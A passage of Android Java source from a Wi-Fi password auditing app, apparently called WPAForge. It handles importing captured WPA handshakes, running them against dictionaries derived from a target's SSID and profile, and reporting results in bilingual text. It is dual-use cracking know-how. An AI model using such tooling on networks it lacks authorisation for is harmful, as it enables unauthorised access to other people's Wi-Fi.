                why = L.s("进程内已有一次比对在运行（可能来自上一次会话）。先点「停止」或清除痕迹。",
                        "A comparison is still running in this process (possibly from a previous "
                                + "session). Stop it or clear the marker first.");
            }
            if (why.isEmpty()) {
                auditBlocker.setText(L.s(
                        "条件已满足，可以开始。完成后结果会固定在下面的结果卡里。",
                        "Ready. When it finishes, the verdict is pinned to the result card "
                                + "below."));
                auditBlocker.setTextColor(AmberTheme.OK);
            } else {
                auditBlocker.setText(why);
                auditBlocker.setTextColor(AmberTheme.WARN);
            }
        }
        refreshOfflineButtons();
    }

    /**
     * 审计页说明（「?」入口）—— 页面上**所有**整段说明都收在这里。
     *
     * <p>分节顺序按「用户会依次产生的疑问」排：
     *   ① 怎么用（四步）② 离线校验是什么 ③ 材料那四种状态什么意思
     *   ④ 结果有几种、各自什么意思 ⑤ 字典指纹/「与当前选择一致」是什么
     *   ⑥ 为什么未命中不等于安全 ⑦ 边界
     */
    private void showAuditHelp() {
        StringBuilder b = new StringBuilder();

        b.append(L.s("① 怎么用（四步）\n"
                        + "1) 导入材料 —— 电脑上抓的握手包（.hc22000 / .22000）\n"
                        + "2) 选一条材料 —— 点材料列表里的那一行就选中了（再点一次看它全部字段）\n"
                        + "3) 选字典 —— 「按目标派生」通常最划算，也可以从字典管理里加载\n"
                        + "4) 开始校验 —— 跑完结果固定在④里，切页/重开都还在\n\n",
                "1) How to use (4 steps)\n"
                        + "1) Import material - a capture made on a desktop (.hc22000 / .22000)\n"
                        + "2) Pick an entry - tap a row in the material list (tap again to see "
                        + "every field)\n"
                        + "3) Pick a dictionary - \"derive from target\" is usually the best value\n"
                        + "4) Run - the verdict is pinned in 4) and survives restarts\n\n"));

        b.append(L.s("② 离线校验是什么\n"
                        + "把材料与你本机字典里的候选口令逐条比对，判断字典里有没有对应密码。\n"
                        + "\u00b7 不需要连接目标 Wi-Fi\n"
                        + "\u00b7 不会向目标网络发起连接请求\n"
                        + "\u00b7 材料和候选口令在本地处理\n"
                        + "\u00b7 找到匹配才表示当前字典里有对应口令\n\n",
                "2) What the offline check is\n"
                        + "Compares the material against every candidate in your local dictionary.\n"
                        + "\u00b7 No connection to the target Wi-Fi\n"
                        + "\u00b7 No request is sent to the target network\n"
                        + "\u00b7 Everything is processed locally\n"
                        + "\u00b7 A match means this dictionary contains the password\n\n"));

        b.append(L.s("③ 材料那四种状态\n"
                        + "\u00b7 可执行 —— 字段齐全且自洽，能跑\n"
                        + "\u00b7 信息不完整 —— 格式没错，但关键值缺了/全零（抓包时没抓到有效值）\n"
                        + "\u00b7 格式错误 —— 字段长度或取值根本不合格式（文件本身是坏的，得重新导出）\n"
                        + "\u00b7 不支持 —— 记录类型不在 WPA*01 / WPA*02 之内\n"
                        + "只看字段非空是不够的：MIC 字段没被抹零、帧内 nonce 全零、"
                        + "Key Version 读不出，这些都会让比对结果毫无意义，所以一律拦下，"
                        + "不会伪装成「密码未命中」。\n\n",
                "3) The four material states\n"
                        + "\u00b7 Runnable - fields complete and self-consistent\n"
                        + "\u00b7 Incomplete - format is fine but a key value is missing/zero\n"
                        + "\u00b7 Malformed - field length or value breaks the format (bad export)\n"
                        + "\u00b7 Unsupported - record type is not WPA*01 / WPA*02\n"
                        + "Non-empty fields are not enough: an un-scrubbed MIC field, an all-zero "
                        + "nonce or an unreadable Key Version makes the comparison meaningless, so "
                        + "those are blocked instead of disguised as a miss.\n\n"));

        b.append(L.s("④ 结果有五种，别混\n"
                        + "\u00b7 命中 —— 字典里就有这个密码（口令默认打码，可显示/复制）\n"
                        + "\u00b7 未命中 —— 字典确实跑满了，里面没有\n"
                        + "\u00b7 已取消 —— 跑了一半被你停掉，什么结论都下不了（不算未命中）\n"
                        + "\u00b7 材料异常 —— 根本没开跑\n"
                        + "\u00b7 执行失败 —— 引擎报错\n\n",
                "4) Five outcomes, do not mix them up\n"
                        + "\u00b7 Hit - the dictionary contains the password\n"
                        + "\u00b7 Miss - the dictionary was fully exhausted, no match\n"
                        + "\u00b7 Cancelled - you stopped it; nothing can be concluded\n"
                        + "\u00b7 Bad material - it never ran\n"
                        + "\u00b7 Failed - the engine errored\n\n"));

        b.append(L.s("⑤ 字典指纹 / 「与当前选择一致」\n"
                        + "指纹是这本字典内容的 SHA-256 前 12 位。条数和名字都可能重名，"
                        + "指纹不会 —— 所以开跑时会把当时那本冻结下来，结果卡上记的就是它。\n"
                        + "结果卡第一条就是「这条结果是不是当前材料 + 当前字典」：\n"
                        + "材料按照文件名/类型/SSID/AP MAC 四个字段比，字典按内容指纹比。\n"
                        + "对不上就会写清楚「结果来自谁、你现在选的是谁」，并给你一个"
                        + "「用当前选择再跑一次」。\n\n",
                "5) Dictionary fingerprint / \"matches current selection\"\n"
                        + "The fingerprint is the first 12 hex of the SHA-256 over the "
                        + "dictionary CONTENT. Names and counts can collide; it cannot. The "
                        + "dictionary is frozen when a run starts, and the result card records it.\n"
                        + "The first line of the result card says whether the result belongs to "
                        + "your current material and dictionary.\n\n"));

        b.append(L.s("⑥ 未命中不代表密码绝对安全\n"
                        + "只代表本次材料 + 这本字典的候选集合没找到匹配。\n"
                        + "密码完全可能存在于别的字典、别的候选集合里。\n\n",
                "6) \"No hit\" does not mean safe\n"
                        + "It only means this material and this candidate set found no match.\n"
                        + "The password may well exist in another dictionary.\n\n"));

        b.append(L.s("⑦ 边界\n"
                        + "只用于你自己拥有或已获授权的网络。对别人的网就是违法。",
                "7) Scope\nFor networks you own or are explicitly authorised to test only."));

        io.github.wlmosv_png.wpaforge.ui.NetDialog d =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.s("审计页怎么用？", "How does this tab work?"), b.toString());
        d.addItem(L.s("去导入材料", "Import material"), dd -> showOfflinePicker());
        d.addItem(L.s("去选字典", "Pick a dictionary"), dd -> showDictPicker());
        d.setPositive(L.s("知道了", "Got it"), null);
        d.show();
    }

    /**
     * 打开字典管理页。
     *
     * <p>唯一入口，命名必须与用户看到的提示语一致（就是「字典管理」）——
     * 上一版这行叫「字典工具（管理 / 生成）」，而空状态提示写的是
     * 「请先去字典管理里新建或导入」，两边用词对不上，等于没有入口。
     */
    private void openDictManager() {
        startActivity(new android.content.Intent(this, DictActivity.class));
    }

    /** 长指纹的紧凑显示（前 12 位，大写）。 */
    private static String shortId(String hex) {
        if (hex == null || hex.isEmpty()) return "\u2014";
        return hex.substring(0, Math.min(12, hex.length()))
                .toUpperCase(java.util.Locale.ROOT);
    }

    /** 兼容旧入口。 */
    private void renderOfflineLog() {
        renderChannelRecords();
    }

    private void renderStrengthLog() {
        renderRecords(runLog.strength, strengthRecBox, strengthLogScroll,
                L.s("尚无记录。输入一个口令点「评估」。",
                        "No records yet. Type a passphrase and hit Check."));
    }

    /**
     * 渲染一个频道的记录列表。
     *
     * <p>从「大块文本日志」换成「一条记录一行」：时间 · 状态 · 对象 · 简短结果。
     * 点一行看完整日志。
     */
    private void renderRecords(io.github.wlmosv_png.wpaforge.audit.RunLog.Channel ch,
                               LinearLayout box, ScrollView scroller, String emptyText) {
        if (box == null) return;
        boolean tail = isNearBottom(scroller) || box.getChildCount() == 0;
        box.removeAllViews();
        java.util.List<io.github.wlmosv_png.wpaforge.audit.RunLog.Line> lines = ch.snapshot();
        if (lines.isEmpty()) {
            if (emptyText != null) box.addView(dimLine(emptyText));
            return;
        }
        for (io.github.wlmosv_png.wpaforge.audit.RunLog.Line ln : lines) {
            final io.github.wlmosv_png.wpaforge.audit.RunLog.Line line = ln;
            TextView row = new TextView(this);
            StringBuilder sb = new StringBuilder();
            sb.append(ln.clock()).append("  ").append(ln.status()).append("  ");
            if (!ln.subject.isEmpty()) sb.append(ln.subject).append("  ");
            sb.append(ln.text);
            row.setText(sb.toString());
            row.setTextSize(AmberTheme.FS_SMALL);
            row.setTextColor(logColor(ln.kind));
            row.setTypeface(Typeface.MONOSPACE);
            row.setLineSpacing(px(3), 1f);
            row.setPadding(px(2), px(3), px(2), px(3));
            if (ln.hasDetail()) row.setOnClickListener(v -> showRecordDetail(line));
            box.addView(row);
        }
        if (tail && scroller != null) {
            final ScrollView s = scroller;
            s.post(() -> s.fullScroll(View.FOCUS_DOWN));
        }
    }

    private boolean isNearBottom(ScrollView sc) {
        if (sc == null || sc.getChildCount() == 0) return true;
        View child = sc.getChildAt(0);
        int diff = child.getBottom() - (sc.getScrollY() + sc.getHeight());
        return diff <= px(24);
    }

    private void showRecordDetail(io.github.wlmosv_png.wpaforge.audit.RunLog.Line ln) {
        io.github.wlmosv_png.wpaforge.ui.NetDialog.textInfo(this,
                ln.clock() + " \u00b7 " + ln.status()
                        + (ln.subject.isEmpty() ? "" : " \u00b7 " + ln.subject),
                ln.detail);
    }

    /** 离线校验频道写一条带上下文的记录。 */
    private void auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind kind, String text) {
        auditLine(kind, "", text, null);
    }

    private void auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind kind,
                           String subject, String text, String detail) {
        runLog.offline.add(System.currentTimeMillis(), kind, subject, text, detail);
        renderChannelRecords();
    }

    /** 字典操作频道写一条记录（与离线校验彻底分开）。 */
    private void dictLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind kind,
                          String subject, String text, String detail) {
        runLog.dict.add(System.currentTimeMillis(), kind, subject, text, detail);
        if (logChannel == io.github.wlmosv_png.wpaforge.audit.RunLog.Op.DICT) {
            renderChannelRecords();
        } else {
            renderChannelChips();
        }
    }

    /** 口令强度评估频道写一条记录。 */
    private void strengthLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind kind, String text) {
        strengthLine(kind, "", text, null);
    }

    private void strengthLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind kind,
                              String subject, String text, String detail) {
        runLog.strength.add(System.currentTimeMillis(), kind, subject, text, detail);
        renderStrengthLog();
    }

    /** 级别 -> 颜色。 */
    private int logColor(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind k) {
        switch (k) {
            case OK:       return AmberTheme.OK;
            case WARN:     return AmberTheme.WARN;
            case FAIL:     return AmberTheme.DANGER;
            case CANCEL:   return AmberTheme.ACCENT_SOFT;
            case PROGRESS: return AmberTheme.TEXT_DIM;
            default:       return AmberTheme.TERM_FG;
        }
    }

    /**
     * 为某个 SSID 准备派生线索。
     *
     * <h3>为什么必须有这个函数（真实缺陷）</h3>
     * {@link io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder#build} 里，
     * SSID 派生是否生效只由 {@code seeds != null && seeds.useSsid} 决定。
     * 旧实现调用的是两参重载（{@code seeds == null}），于是「按材料 SSID 派生字典」
     * 实际产出的是一份**与 SSID 完全无关**的通用弱口令表（实测 40 条，
     * 由 build 自己给出的说明写着「SSID 派生: 关」），
     * 而字典名却是 {@code 定向派生 · <SSID>} ——
     * 名字说 A、内容其实是 B，用户事后核对时无从发现。
     *
     * <p>这里显式给一个 {@code useSsid = true} 的线索模型：用户点的就是
     * 「按 SSID 派生」，这一项必须是开。
     *
     * <p>线索只从**同一个网络**取：材料 SSID 与破解页选中的目标一致时才复用它的画像，
     * 否则一条线索都不用（别人的手机号不应该是这个网的密码素材）。
     * 复用走 encode/decode 克隆，避免把用户保存的画像在内存里改掉。
     */
    private io.github.wlmosv_png.wpaforge.audit.SeedModel seedModelForSsid(String ssid) {
        io.github.wlmosv_png.wpaforge.audit.SeedModel m;
        String cur = targetNet == null || targetNet.ssid == null
                ? "" : targetNet.ssid.trim();
        if (!cur.isEmpty() && cur.equalsIgnoreCase(ssid.trim())) {
            io.github.wlmosv_png.wpaforge.audit.SeedModel src =
                    profileForCurrentTarget().seeds;
            m = io.github.wlmosv_png.wpaforge.audit.SeedModel.decode(
                    src == null ? "" : src.encode());
        } else {
            m = new io.github.wlmosv_png.wpaforge.audit.SeedModel();
        }
        m.useSsid = true;
        return m;
    }

    /**
     * 把「从服务 / 队列权威重建」的当前字典同步进工作台与持久层。
     *
     * <p>审计页只认工作台里的快照。如果只在别处给 {@code currentDict} 赋值，
     * 就会出现「破解页显示有字典、审计页说没有」这类前后不一致 ——
     * 所以每一个给 {@code currentDict} 赋值的权威入口都必须带上这一步。
     */
    private void syncWorkbenchDict() {
        if (currentDict == null || currentDict.isEmpty()) {
            workbench.clearDictionary();
            renderAudit();
            return;
        }
        if (workbench.setDictionary(currentDictName, currentDictSource, currentDictPath,
                currentDict)) {
            io.github.wlmosv_png.wpaforge.DictSnapshotStore.save(this, workbench.dictionary());
            dictEpoch++;
        }
        renderAudit();
    }

    /** 字节数的人话。 */
    private static String fmtBytes(long b) {
        if (b <= 0) return "\u2014";
        if (b < 1024) return b + " B";
        if (b < 1024 * 1024) return String.format(java.util.Locale.ROOT, "%.1f KB", b / 1024.0);
        return String.format(java.util.Locale.ROOT, "%.2f MB", b / 1048576.0);
    }

    /**
     * 恢复上次的当前字典。
     *
     * <p>应用重开后 {@code currentDict} 是空的，只显示「未选择」是没用的信息 ——
     * 用户上一秒刚派生过一本。这里按持久化的快照 + **文件指纹**把它读回来；
     * 文件不在了或内容变了就明确说「已失效」，不用来路不明的内容顶替。
     */
    private void restoreDictIfPossible() {
        if (currentDict != null && !currentDict.isEmpty()) return;
        final io.github.wlmosv_png.wpaforge.audit.DictSnapshot saved =
                io.github.wlmosv_png.wpaforge.DictSnapshotStore.load(this);
        if (!saved.present()) return;
        if (!saved.onDisk()) {
            dictRestoreNote = L.f(
                    "上次使用的字典「%s」（%d 条，指纹 %s）只存在于内存里，"
                            + "应用重开后已失效，请重新选择或派生一本。",
                    "The dictionary \"%s\" (%d entries, id %s) lived only in memory; after the "
                            + "restart it is gone. Pick or derive one again.",
                    saved.name, saved.count, saved.fingerprint());
            return;
        }
        final String path = saved.filePath;
        final long epoch = dictEpoch;   // 恢复开始时的代际
        new Thread(() -> {
            String nowHash = io.github.wlmosv_png.wpaforge.audit.DictSnapshot
                    .sha256OfFile(path);
            java.util.List<Candidate> loaded = null;
            if (!nowHash.isEmpty() && nowHash.equals(saved.fileSha256)) {
                try {
                    loaded = io.github.wlmosv_png.wpaforge.audit.DictStore.load(
                            new java.io.File(path), 0);
                } catch (Throwable ignored) {
                }
            }
            final java.util.List<Candidate> r = loaded;
            final String h = nowHash;
            ui.post(() -> {
                // 代际/占用校验：算指纹是秒级操作，这段时间里用户完全可能自己挑了一本。
                // 没有这道检查，后到的恢复 post 会把用户刚选的字典**覆盖回**"上次那本"，
                // 而且连续两次 Toast，用户还以为是自己点出来的。
                if (dictEpoch != epoch
                        || (currentDict != null && !currentDict.isEmpty())) {
                    return;
                }
                if (r != null && !r.isEmpty() && saved.matches(r)) {
                    applyDict(r, saved.name, path, saved.source);
                    dictRestoreNote = "";
                    dictLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.INFO, saved.name,
                            L.s("已恢复上次使用的字典", "Restored the last dictionary"),
                            L.f("名称: %s\n条数: %d\n内容指纹: %s\n文件: %s\n文件指纹: %s",
                                    "Name: %s\nEntries: %d\nContent id: %s\nFile: %s\nFile id: %s",
                                    saved.name, r.size(), saved.fingerprint(), path,
                                    saved.fileId()));
                } else {
                    dictRestoreNote = L.f(
                            "上次使用的字典「%s」（%d 条，指纹 %s）已失效：%s。"
                                    + "为避免跑错内容，请重新选择或派生一本。",
                            "The last dictionary \"%s\" (%d entries, id %s) is stale: %s. "
                                    + "Pick or derive one again to avoid running the wrong content.",
                            saved.name, saved.count, saved.fingerprint(),
                            h.isEmpty()
                                    ? L.s("文件不存在或不可读", "file missing or unreadable")
                                    : L.s("文件内容已被改动", "file content changed"));
                }
                renderAudit();
            });
        }, "wpaforge-dict-restore").start();
    }

    /** 审计页的「内置生成器」：与破解页同一条实现（先落盘再设为当前字典）。 */
    private void buildGenericDictFromAudit() {
        dictLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.INFO,
                L.s("内置生成器", "Built-in generator"),
                L.s("正在编排通用载荷…", "Building the built-in dictionary..."), null);
        buildGenericDict(true);
    }


    /** 收集目录下的 22000 材料文件（只认扩展名，不递归）。 */
    private void scanHcFiles(java.io.File dir, java.util.List<java.io.File> out) {
        java.io.File[] fs = dir.listFiles();
        if (fs == null) return;
        for (java.io.File f : fs) {
            if (!f.isFile()) continue;
            String n = f.getName().toLowerCase();
            if (n.endsWith(".hc22000") || n.endsWith(".22000")) out.add(f);
        }
    }

    /**
     * 导入材料的入口：**直接**打开系统文件选择器。
     *
     * <p>1.9.44 起不再让用户先过一层「两条通道」的弹窗 —— 抽查显示大多数人
     * 只是被那道选择挡住。SAF 是唯一不依赖任何存储权限、且任何目录都能取的通道，
     * 就是它了；「扫描 Download」作为备用路径单独留一行。
     *
     * <p>修复前这里直接 {@code new File("/sdcard/Download").listFiles()}：
     * 在分区存储下（targetSdk 35、未申请 MANAGE_EXTERNAL_STORAGE），应用只能看到
     * **本应用自己写入**的 Download 文件，别人放进去的材料一律不可见；而且
     * {@code listFiles()} 返回 null 时静默跳过，最终统一塌成一句
     * 「没找到 .hc22000 / .22000 文件」—— 用户拿不到任何可执行信息。
     */
    private void showOfflinePicker() {
        if (offlineBusy) {
            Toast.makeText(this, L.s("正在比对，等这一轮结束", "Already running"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        pickOfflineFileViaSaf();
    }

    /** 备用通道：扫描 Download（只对「本应用可见的文件」有效，扫不到就说明原因）。 */
    private void showDownloadScan() {
        final java.util.List<java.io.File> files = new java.util.ArrayList<>();
        scanHcFiles(new java.io.File("/sdcard/Download"), files);
        scanHcFiles(new java.io.File("/sdcard/Download/WPAForge-hc"), files);
        java.util.Collections.sort(files, (a, b) -> a.getName().compareToIgnoreCase(b.getName()));

        io.github.wlmosv_png.wpaforge.ui.NetDialog dlg =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(
                        this, L.s("Download 目录里的材料", "Material in Download"), null);
        if (files.isEmpty()) {
            dlg.addHint(L.s(
                    "没有发现材料。\n"
                            + "Android 11 起，应用只能看到自己写入的 Download 文件；"
                            + "由其他应用或电脑放进来的材料请用上面第 ① 步的选择器。\n"
                            + "已扫描 /sdcard/Download 与 /sdcard/Download/WPAForge-hc。",
                    "Nothing found.\n"
                            + "Since Android 11 an app only sees Download files it wrote itself; "
                            + "material placed by other apps or a PC must go through the picker "
                            + "in step 1.\n"
                            + "Scanned /sdcard/Download and /sdcard/Download/WPAForge-hc."));
        } else {
            for (java.io.File f : files) {
                final java.io.File pick = f;
                dlg.addItem(f.getName() + "  (" + Math.max(1, f.length() / 1024) + " KB)",
                        d -> runOfflineRead(pick));
            }
        }
        dlg.setNegative(L.s("取消", "Cancel"), null);
        dlg.show();
    }

    /** 启动系统文件选择器（SAF）—— 不依赖任何存储权限的读取通道。 */
    private void pickOfflineFileViaSaf() {
        try {
            android.content.Intent i = new android.content.Intent(
                    android.content.Intent.ACTION_OPEN_DOCUMENT);
            i.addCategory(android.content.Intent.CATEGORY_OPENABLE);
            i.setType("*/*");
            // 22000 材料是纯文本，但各家文件管理器给的 MIME 并不统一，
            // 这里给一组常见值再加 */* 兜底，避免文件被选择器灰掉。
            i.putExtra(android.content.Intent.EXTRA_MIME_TYPES,
                    new String[]{"application/octet-stream", "text/plain", "*/*"});
            i.addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION);
            startActivityForResult(i, REQ_OFFLINE_PICK);
        } catch (Throwable t) {
            appendLog(L.s("无法打开系统文件选择器: ", "Cannot open the system file picker: ")
                    + io.github.wlmosv_png.wpaforge.audit.OfflineImport
                    .classifyReadFailure(t));
        }
    }

    /** 系统文件选择器的返回。取消 / 没数据都算「没有选择文件」，不再静默。 */
    private void handleOfflinePick(int resultCode, android.content.Intent data) {
        final android.net.Uri uri = data == null ? null : data.getData();
        if (resultCode != RESULT_OK || uri == null) {
            auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.CANCEL,
                    L.s("已取消选择材料文件（没有选中任何文件）。",
                            "Material selection cancelled (no file picked)."));
            return;
        }
        // 这里原本申请持久化读取授权，但全链路没有任何地方保存/复用这个 URI，
        // 失败还被 catch(Throwable ignored) 静默吞掉 —— 属于"看着有用、实际不用、
        // 出错还看不见"的死代码（每次导入还会占一个持久授权名额且永不释放）。
        // 本次读取靠的是本次的临时授权，够用，所以直接去掉。
        runOfflineReadUri(uri);
    }

    /** 从 Content URI 读材料 —— 绝不假设 URI 能转成普通文件路径。 */
    private void runOfflineReadUri(final android.net.Uri uri) {
        final String shown = uriDisplayName(uri);
        appendLog(L.s("读取材料: ", "Reading: ") + shown);
        new Thread(() -> {
            final io.github.wlmosv_png.wpaforge.audit.OfflineImport.Result r;
            try {
                r = readOfflineText(getContentResolver().openInputStream(uri));
            } catch (Throwable t) {
                ui.post(() -> reportOffline(shown, io.github.wlmosv_png.wpaforge.audit
                        .OfflineImport.classifyReadFailure(t), null, t));
                return;
            }
            ui.post(() -> reportOffline(shown, r.status, r, null));
        }, "wpaforge-offline-read").start();
    }

    /** 取 URI 的显示名；失败时退回 URI 末段，绝不抛。 */
    private String uriDisplayName(android.net.Uri uri) {
        try {
            android.database.Cursor c = getContentResolver().query(uri,
                    new String[]{android.provider.OpenableColumns.DISPLAY_NAME},
                    null, null, null);
            if (c != null) {
                try {
                    if (c.moveToFirst()) {
                        String n = c.getString(0);
                        if (n != null && !n.isEmpty()) return n;
                    }
                } finally {
                    c.close();
                }
            }
        } catch (Throwable ignored) {
        }
        String last = uri.getLastPathSegment();
        return last == null ? String.valueOf(uri) : last;
    }

    /**
     * 读文本：上限 4 MB，超出即判 TOO_LARGE。
     *
     * <p>判定逻辑放在 {@code OfflineImport.analyzeStream}，这里只负责打开与关闭流 ——
     * 让门禁测试能直接跑同一条代码路径，而不是各自一套。
     */
    private io.github.wlmosv_png.wpaforge.audit.OfflineImport.Result readOfflineText(
            java.io.InputStream raw) throws Exception {
        try {
            return io.github.wlmosv_png.wpaforge.audit.OfflineImport.analyzeStream(raw);
        } finally {
            if (raw != null) try {
                raw.close();
            } catch (Throwable ignored) {
            }
        }
    }

    /**
     * 统一出口：把「读取 / 解析」两段的结论翻成人话，并说清下一步。
     *
     * <p>修复前这里只有两种输出：「没找到文件」和「文件里没有可用材料」。
     * 现在按 {@link io.github.wlmosv_png.wpaforge.audit.OfflineImport.Status}
     * 分别给出原因与处置动作。
     */
    /**
     * 统一收口：读取 / 解析失败除了写日志，还要落到结果卡上。
     *
     * <p>否则「材料有问题」只活在一行日志里，一翻页就没了；用户下次看到结果卡
     * 还是上一次的命中，会以为材料一直是好的。
     */
    private void reportOffline(String name,
                               io.github.wlmosv_png.wpaforge.audit.OfflineImport.Status st,
                               io.github.wlmosv_png.wpaforge.audit.OfflineImport.Result r,
                               Throwable err) {
        reportOfflineInner(name, st, r, err);
        if (st == io.github.wlmosv_png.wpaforge.audit.OfflineImport.Status.OK) return;
        String why;
        switch (st) {
            case EMPTY:         why = L.s("文件为空", "file is empty"); break;
            case FORMAT_INVALID: why = L.s("不是合法的 22000 记录", "not a valid 22000 line"); break;
            case UNSUPPORTED:   why = L.s("记录类型不支持", "unsupported record type"); break;
            case TOO_LARGE:     why = L.s("文件超过 4 MB", "file exceeds 4 MB"); break;
            case INCOMPLETE:    why = L.s("记录合法但缺 SSID（隐藏网络），无法用于离线校验",
                                    "well-formed records but no SSID (hidden network) - cannot "
                                            + "be used for an offline check"); break;
            case NO_FILE:       why = L.s("没有拿到文件", "no file was returned"); break;
            case NO_ACCESS:     why = L.s("没有读取授权", "read access was not granted"); break;
            default:            why = err == null ? L.s("读取失败", "read failed") : String.valueOf(err);
        }
        if (st == io.github.wlmosv_png.wpaforge.audit.OfflineImport.Status.TOO_LARGE
                && r != null && r.bytes > 0) {
            why = why + L.s("（实际 " + fmtBytes(r.bytes) + "）",
                    " (actual " + fmtBytes(r.bytes) + ")");
        }
        // 步骤 ①/② 的状态必须跟着走：材料没进来，后面三步不该还停在旧状态。
        offEntries = null;
        diagOpen.clear();
        workbench.onMaterialProblem(name, why);
        lastEntry = null;
        lastReport = null;
        setVerdict(verdictOf(
                io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State.BAD_MATERIAL,
                null, name, workbench.dictionary(), 0, 0, "", why));
        renderAudit();
    }

    private void reportOfflineInner(String name,
                                    io.github.wlmosv_png.wpaforge.audit.OfflineImport.Status st,
                                    io.github.wlmosv_png.wpaforge.audit.OfflineImport.Result r,
                                    Throwable err) {
        switch (st) {
            case OK:
                break;
            case EMPTY:
                auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.FAIL,
                        L.s("材料解析失败: 文件是空的（或只有空行 / 注释行）。",
                        "Parse failed: the file is empty (or only blank/comment lines)."));
                appendLog(L.s("下一步: 确认材料文件已写完整，重新导出一份再试。",
                        "Next: re-export the capture - it looks truncated to zero content."));
                return;
            case FORMAT_INVALID:
                appendLog(L.f("材料解析失败: 没有一行是合法的 hashcat 22000 记录（不合格行 %d）。",
                        "Parse failed: no valid hashcat 22000 line (bad lines: %d).",
                        r == null ? 0 : r.bad));
                appendLog(L.s(
                        "下一步: 每行应形如 WPA*01*... 或 WPA*02*...；"
                                + "确认不是把 .pcap/.cap 直接改了扩展名，"
                                + "导出请用 hcxpcapngtool 或 hcxdumptool。",
                        "Next: each line must look like WPA*01*... or WPA*02*...; make sure the file "
                                + "is not a .pcap/.cap renamed; export with hcxpcapngtool or hcxdumptool."));
                return;
            case UNSUPPORTED:
                appendLog(L.f("材料解析失败: 记录类型不支持（%d 条）。",
                        "Parse failed: unsupported record type (%d entries).",
                        r == null ? 0 : r.unsupported));
                appendLog(L.s("下一步: 本功能只处理 PMKID（WPA*01）与 EAPOL（WPA*02）两种记录。",
                        "Next: only PMKID (WPA*01) and EAPOL (WPA*02) records are supported."));
                return;
            case INCOMPLETE:
                // 这不是"文件坏了"，是"材料用不了" —— 处置完全不同。
                // 原来它被算成「不是合法的 22000 记录」，把用户引向"重新导出"这条走不通的路。
                auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.WARN, name,
                        L.f("记录格式合法，但 %d 条都缺少 SSID。",
                                "%d well-formed record(s), but all lack an SSID.",
                                r == null ? 0 : r.noSsid),
                        L.s("SSID 是派生 PMK 必需的：没有它，任何候选都无法比对，"
                                + "所以这一份材料无法用于离线校验。\n"
                                + "下一步：换一份抓到了 SSID 的材料（抓包时等目标广播 beacon，"
                                + "或换一条已关联上的记录）—— 不需要重新导出同一个文件。",
                                "The SSID is required to derive the PMK: without it no candidate "
                                        + "can ever match, so this material cannot be used for an "
                                        + "offline check.\nNext: use a capture that contains the "
                                        + "SSID (wait for the target's beacon, or pick a record from "
                                        + "an associated session) - re-exporting the same file will "
                                        + "not help."));
                appendLog(L.s("材料不可用: 缺 SSID（隐藏网络）。不是文件损坏，换个材料即可。",
                        "Material unusable: SSID missing (hidden network). The file is not "
                                + "corrupt - use a different capture."));
                return;
            case TOO_LARGE:
                appendLog(L.s("材料读取失败: 文件超过 4 MB。", "Read failed: file exceeds 4 MB."));
                appendLog(L.s("下一步: 离线校验只针对单次抓包材料，先裁剪到 4 MB 以内。",
                        "Next: offline check targets one capture; trim the file below 4 MB first."));
                return;
            case NO_FILE:
                appendLog(L.s("材料读取失败: 没有拿到文件。", "Read failed: no file was returned."));
                appendLog(L.s("下一步: 重新点「选择材料文件」，在系统文件选择器里选中一个文件。",
                        "Next: tap the button again and pick a file in the system picker."));
                return;
            case NO_ACCESS:
                appendLog(L.s("材料读取失败: 系统没有授予该文件的读取权限。",
                        "Read failed: the system did not grant read access to that file."));
                appendLog(L.s("下一步: 重新选择一次；若仍失败，换 Download 目录下的文件，"
                                + "或在系统文件选择器里对该目录授权。",
                        "Next: select it again; if it still fails, use a file under Download, "
                                + "or grant access to that folder from the system picker."));
                return;
            default:
                appendLog(L.s("材料读取失败: ", "Read failed: ")
                        + (err == null ? L.s("未知错误", "unknown error") : String.valueOf(err)));
                appendLog(L.s("下一步: 确认文件没有被其他应用占用，或换一个文件再试。",
                        "Next: make sure no other app is holding the file, or try another file."));
                return;
        }

        // 解析成功：材料进步骤 ①/②，由用户在步骤 ② 里选一条，再在步骤 ④ 开跑。
        // （旧版在这里弹一个「选哪条」的对话框，把顺序打乱了：用户还没看到材料诊断
        //   就被要求做选择，选完才第一次见到字段。）
        java.util.List<io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry> entries = r.entries;
        offEntries = entries;
        diagOpen.clear();
        workbench.onMaterialOk(name, r.bytes, r.sha256,
                r.count(), r.pmkid, r.eapol);
        auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.OK, name,
                L.f("材料就绪: %d 条（PMKID %d / EAPOL %d）",
                        "Material ready: %d entries (%d PMKID / %d EAPOL)",
                        r.count(), r.pmkid, r.eapol),
                L.f("文件: %s\n大小: %s\nSHA-256: %s\n记录数: %d\nPMKID: %d\nEAPOL: %d",
                        "File: %s\nSize: %s\nSHA-256: %s\nRecords: %d\nPMKID: %d\nEAPOL: %d",
                        name, fmtBytes(r.bytes),
                        r.sha256.isEmpty() ? "\u2014" : r.sha256,
                        r.count(), r.pmkid, r.eapol)
                        + (r.comments > 0
                                ? L.f("\n跳过注释行: %d", "\ncomment lines skipped: %d", r.comments)
                                : "")
                        // 缺 SSID 的记录原来**静默消失**：只报 count()，不说少了多少。
                        + (r.noSsid > 0
                                ? L.f("\n跳过（缺 SSID，隐藏网络）: %d",
                                      "\nskipped (no SSID, hidden network): %d", r.noSsid)
                                : ""));

        // 自动选中第一条**可执行**的材料，这样单条材料可以一步开跑；
        // 多条材料时用户可以在步骤 ② 里改选。
        // 必须扫**全部**条目：只扫前 MAX_DIAG_CARDS 条时，一份上千条记录的文件里
